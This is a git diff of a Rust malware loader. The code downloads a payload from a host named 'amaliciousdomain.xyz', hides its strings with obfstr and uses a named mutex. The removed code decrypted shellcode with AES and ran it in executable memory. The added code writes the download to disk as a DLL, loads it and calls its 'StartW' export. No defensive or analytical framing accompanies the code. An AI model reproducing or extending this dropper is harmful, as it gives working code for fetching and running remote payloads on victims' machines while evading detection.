@@ -3,38 +3,15 @@ use std::process::exit;
 //common use
 use bytes::Bytes;
 use region::{Protection, Allocation};
-use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
 use named_lock::NamedLock;
 use named_lock::Result;
+use std::fs::File;
+use std::io::prelude::*;
 
-type Aes256CbcDec = cbc::Decryptor<aes::Aes128>;
-
-const URL: &str = "http://grape.amaliciousdomain.xyz:8080/test.woff";
-
-const AESKEY: &str = "dZ5q3dpluLhWRaKW";
-const AESIV: &str  = "1oMP8BCaEbmTHj3F";
+const URL: &str = "http://grape.amaliciousdomain.xyz:8000/LONG_FIR.dll";
 
 const LOCKNAME: &str = "3rBoOnIoREnE";
 
-fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
-    println!("starting decrypt");
-    let mut key = [0x42; 16];
-    let mut iv = [0x24; 16];
-    for (i, b) in obfstr::obfstr!(AESKEY).as_bytes().iter().enumerate() {
-        key[i] = *b;
-    }
-    for (i, b) in obfstr::obfstr!(AESIV).as_bytes().iter().enumerate() {
-        iv[i] = *b;
-    }
-    println!("done w/ keys");
-    let mut buf: Vec<u8> = Vec::with_capacity(size);
-    println!("created the buffer");
-    let _pt = Aes256CbcDec::new(&key.into(), &iv.into())
-        .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buf)
-        .unwrap();
-    println!("decyprted");
-    return buf;
-}
 
 fn getscode(url: &str) -> Bytes {
     let client = reqwest::blocking::Client::builder()
@@ -50,35 +27,24 @@ fn getscode(url: &str) -> Bytes {
         Ok(b) => b,
         Err(_) => panic!("")
     };
-    // note, skip the first 16 bytes since they are the IV, might want to remove the IV from being in code and 
-    // add it to the decypt function
-    //let pt = decrypt(&rbytes[16..], rbytes.len());
-    //let ptb = Bytes::from(pt);
+    return rbytes;
+}
 
-    // we're ignoring decryption for the moment
-    let ptb = Bytes::from(rbytes);
-
-    return ptb;
+fn writefile(rbytes: bytes::Bytes) {
+    let mut file = File::create("foo.dll").unwrap();
+    file.write_all(&rbytes);
 }
 
 fn dne() -> Result<(), region::Error> {
     //download the payload
     let rbytes = getscode(obfstr::obfstr!(URL));
-    // allocate and copy
+    writefile(rbytes);
     unsafe {
-        //allocate
-        let base_addr: Allocation = region::alloc(rbytes.len(), Protection::READ_WRITE)?;
-        //copy
-        std::ptr::copy(rbytes.as_ptr() as  _, base_addr.as_ptr::<u8>() as *mut u8, rbytes.len());
-        // change to ex and cast
-        let ep: extern "C" fn() -> i32 = {
-            region::protect(base_addr.as_ptr::<u8>(), rbytes.len(), region::Protection::READ_EXECUTE)?;
-            std::mem::transmute(base_addr.as_ptr::<u8>())
-        };
-        //run it
-        ep();
-        Ok(())
+        let lib = libloading::Library::new("foo.dll").unwrap();
+        let func: libloading::Symbol<unsafe extern fn() -> u32> = lib.get(b"StartW").unwrap();
+        func();
     }
+    Ok(())
 }
 
 fn main() {
